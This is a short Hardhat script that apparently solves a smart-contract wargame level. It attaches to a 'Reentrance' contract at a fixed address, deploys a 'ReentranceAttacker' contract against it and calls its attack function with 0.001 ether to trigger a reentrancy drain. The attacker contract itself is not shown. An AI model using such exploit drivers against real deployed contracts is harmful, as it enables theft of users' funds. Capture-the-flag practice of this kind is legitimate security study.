import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x70Ea78909BB68f03e42Ea249EC2E6B4C481C21c4";
const CONTRACT_NAME = "Reentrance";
const ATTACKER_NAME = "ReentranceAttacker";

async function main() {
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const attackerContractFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerContractFactory.deploy(contract.address);
  await attackerContract.deployed();

  const sentEther = ethers.utils.parseEther("0.001");

  const tx = await attackerContract.attack({ value: sentEther });
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
